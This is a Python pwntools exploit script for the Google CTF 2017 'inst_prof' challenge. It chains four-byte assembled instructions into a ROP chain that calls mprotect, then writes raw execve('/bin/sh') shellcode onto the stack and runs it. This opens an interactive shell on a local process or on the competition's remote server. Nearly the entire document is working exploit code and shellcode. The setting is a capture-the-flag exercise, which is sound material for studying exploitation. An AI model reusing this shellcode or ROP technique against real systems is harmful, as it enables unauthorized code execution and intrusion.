# from https://develbranch.com/ctf/google-ctf-2017-inst-prof-writeup.html

from pwn import *
 
context.arch = ELF('./inst_prof').arch
 
def assemble(code):
    encoding = asm(code)
    if len(encoding) > 4:
        raise Exception("TOO LONG! len=%d" % len(encoding))
    while len(encoding) < 4:
        encoding += '\xc3'
    return encoding
 
def set_byte_r15(n):
    if n <= 0x7f:
        return assemble('push %d; pop r15' % n)
    else:
        return assemble('xor r15, r15') + assemble('inc r15') * n
 
def store_r15(offset):
    return assemble('push rsp; pop r14') + assemble('inc r14') * offset + assemble('mov [r14], r15')
 
def load_to_r15(offset):
    return assemble('push rsp; pop r14') + assemble('inc r14') * offset + assemble('mov r15, [r14]')
 
def write_string(offset, s):
    encoding = ''
    for c in s:
        encoding += set_byte_r15(ord(c))
        encoding += store_r15(offset)
        offset += 1
    return encoding
 
# Execute /bin/sh - 27 bytes : http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
 
print ('Generating opcodes ...')
addr = 0x40
opcode = ''
opcode += load_to_r15(0)
opcode += assemble('inc r15') * (0xbc3 - 0xb18)
opcode += store_r15(0x100)  # store pointer to gadget 0x00000bc3: pop rdi ; ret
opcode += load_to_r15(0)
opcode += assemble('dec r15') * (0xb18 - 0xaab)  # 0x00000aab: pop rbx ; pop r12 ; pop rbp ; ret
opcode += store_r15(addr)
opcode += set_byte_r15(0)
opcode += store_r15(addr + 0x8)  # rbx must be 0
opcode += assemble('push rsp; pop r15')
opcode += assemble('inc r15') * 0x100
opcode += store_r15(addr + 0x10)  # store address of pointer to gadget 0x00000bc3: pop rdi ; ret
opcode += set_byte_r15(0)
opcode += store_r15(addr + 0x18)  # filler
opcode += load_to_r15(0)
opcode += assemble('inc r15') * (0xbbe - 0xb18)  # 0x00000bbe: pop r13 ; pop r14 ; pop r15 ; ret
opcode += store_r15(addr + 0x20)
opcode += set_byte_r15(7)
opcode += store_r15(addr + 0x28)  # protection = PROT_READ | PROT_WRITE | PROT_EXEC
opcode += assemble('mov r15, rcx')  # R15 = 0x1000
opcode += store_r15(addr + 0x30)  # SIZE
opcode += set_byte_r15(0)
opcode += store_r15(addr + 0x38)  # filler
opcode += load_to_r15(0)
opcode += assemble('inc r15') * (0xba0 - 0xb18)  # 0xba0: mov rdx,r13; mov rsi,r14; mov edi,r15d; call qword [r12+rbx*8]
opcode += store_r15(addr + 0x40)
opcode += load_to_r15(0)
opcode += assemble('inc r15') * (0xbc3 - 0xb18)  # 0x00000bc3: pop rdi ; ret
opcode += store_r15(addr + 0x48)  # remove junk address from previous call
opcode += assemble('push rsp; pop r15')
opcode += assemble('mov r14, rcx')  # R14 = 0x1000
opcode += assemble('dec r14')
opcode += assemble('not r14')
opcode += assemble('and r15, r14')
opcode += store_r15(addr + 0x50)  # memory address
opcode += load_to_r15(0)
opcode += assemble('dec r15') * (0xb18 - 0x820)
opcode += store_r15(addr + 0x58)  # address of mprotect
opcode += assemble('push rsp; pop r15')
opcode += assemble('inc r15') * (addr + 0x70)
opcode += store_r15(addr + 0x60)  # address of shellcode
opcode += write_string(addr + 0x70, shellcode)
opcode += set_byte_r15(addr)
opcode += assemble('add rsp, r15')
 
if args['REMOTE']:
    io = remote('inst-prof.ctfcompetition.com', 1337)
else:
    # b *0x0555555554B18
    io = process('./inst_prof')
    gdb.attach(io, '''
    ''')
    raw_input('Go?')
 
io.send(opcode)
io.interactive()
